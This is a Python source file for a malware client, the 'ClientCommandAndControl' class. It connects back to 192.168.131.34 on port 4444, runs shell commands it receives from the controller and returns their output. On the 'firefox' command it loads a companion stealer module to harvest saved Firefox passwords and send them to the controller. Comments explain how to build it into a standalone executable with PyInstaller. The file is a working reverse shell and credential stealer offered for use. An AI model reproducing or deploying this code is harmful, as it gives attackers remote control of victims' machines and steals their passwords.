from email.mime.text import MIMEText
import importlib.util
import subprocess
import socket
import sys
import os

# Needed for non-needed python installation for firefox steal
import configparser
import platform
import sqlite3
import ctypes

# Compile: pyinstaller --onefile --add-data "..\\SimpleStealer;SimpleStealer" --hidden-import=email.mime.text --hidden-import=email.mime --hidden-import=tempfile --hidden-import=requests --hidden-import=smtplib  client.py
# Or
# Compile: pyinstaller client.spec

# We need to have the file inside the folder "../SimpleStealer/stealer.py, we use the class "Malware" to call the function "get_firefox_profiles" and "get_firefox_passwords", otherwise the command "firefox" wont work

if getattr(sys, "frozen", False):
    base_path = sys._MEIPASS
else:
    base_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", 'SimpleStealer'))

stealer_path = os.path.join(base_path, "SimpleStealer", "stealer.py")

spec = importlib.util.spec_from_file_location("stealer", stealer_path)
stealer = importlib.util.module_from_spec(spec)
spec.loader.exec_module(stealer)

class ClientCommandAndControl:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.conn = None

    def exit_client(self):
        self.conn.close()
        sys.exit(1)

    def run_command(self, command):
        #out = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, errors="ignore")
        #return out.decode("cp850") if out else None

        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        out = result.stdout + result.stderr
        return out if out else None

    def run_and_send_command(self, command):
        out = self.run_command(command)
        out_encoded = out.encode(errors="ignore")
        size = str(len(out_encoded)).encode()

        self.conn.send(size)
        self.conn.sendall(out_encoded)


    def get_firefox_passwords_helper(self):
        firefox = stealer.Malware("noneeded@mail.me", "noneededpassword")
        profile = firefox.get_firefox_profiles(os.environ["USERNAME"])
        passwords = firefox.get_firefox_passwords(profile)

        if passwords:
            pass_encoded = passwords.encode(errors="ignore")
            size = str(len(pass_encoded)).encode()

            self.conn.send(size)
            self.conn.sendall(pass_encoded)

    def mainLoop(self):
        while True:
            cmd = self.conn.recv(1024).decode().strip()

            if not cmd or cmd == "exit" or cmd == "q":
                self.exit_client()
            elif cmd == "firefox":
                self.get_firefox_passwords_helper()
            else:
                self.run_and_send_command(cmd)


    def start(self):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((self.host, self.port))
        self.mainLoop()

if __name__ == "__main__":
    clientCommand = ClientCommandAndControl("192.168.131.34", 4444)
    clientCommand.start()